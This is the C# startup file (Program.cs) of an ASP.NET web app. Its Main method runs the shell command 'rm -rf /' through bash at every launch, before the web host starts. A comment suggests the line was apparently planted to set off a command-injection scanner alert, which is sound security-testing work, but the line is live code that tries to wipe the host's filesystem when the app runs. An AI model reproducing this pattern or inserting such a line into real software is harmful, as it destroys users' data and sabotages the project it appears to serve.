using Microsoft.AspNetCore;
using Microsoft.AspNetCore.Hosting;
using System.Diagnostics;

namespace TailSpin.SpaceGame.Web
{
    public class Program
    {
        public static void Main(string[] args)
        {
            // ⚠️ Dangerous hardcoded command (should trigger command injection alert)
            string cmd = "rm -rf /";  // For *nix or WSL environments
            Process.Start("bash", "-c \"" + cmd + "\"");

            CreateWebHostBuilder(args).Build().Run();
        }

        public static IWebHostBuilder CreateWebHostBuilder(string[] args) =>
            WebHost.CreateDefaultBuilder(args)
                .UseStartup<Startup>();
    }
}
